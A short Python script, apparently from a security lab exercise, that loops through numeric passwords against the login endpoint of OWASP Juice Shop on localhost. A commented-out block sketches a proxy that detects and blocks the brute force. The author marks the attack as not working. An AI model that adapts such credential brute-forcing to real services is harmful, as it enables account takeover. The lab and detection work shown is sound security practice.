import requests


# not work !!
def brute_force_attack_password_to_juice_shop():
    # SITE_NAME = 'http://127.0.0.1:5000/#/login'

    for i in range(123450, 123470):
        headers = {"Content-Type": "application/json; charset=utf-8"}
        payload = {'email': 'a@gmail.com', 'password': i}
        session = requests.Session()
        res = session.post('http://localhost:5000/rest/user/login', data=payload,
                           headers=headers)  # TO DO: write into db the password in case of succeed
        print(res.text)


brute_force_attack_password_to_juice_shop()

"""
# post data for juice shop http://localhost:5000/#/login
@app.route('/rest/user/login', methods=['POST', 'GET'])
def login(request):
    sender_ip = request.remote_addr
    raw_data = request.get_data(as_text=True)
    payload_array = raw_data.split("&")
    email = (payload_array[0].split("="))[1].replace("%40", "@")
    password = (payload_array[1].split("="))[1]
    print(email + "  ::  " + password)
    payload = {'email': email, 'password': password}
    if detect_brute_force_password(email, password, sender_ip):  # extract ip and time
        return abort_503()

    return requests.post(f'{SITE_NAME}/rest/user/login', payload).content
    
    ****************************************************************
    
    # my_data = '{"quantity":3,"nudnik":true}'.encode()

"""
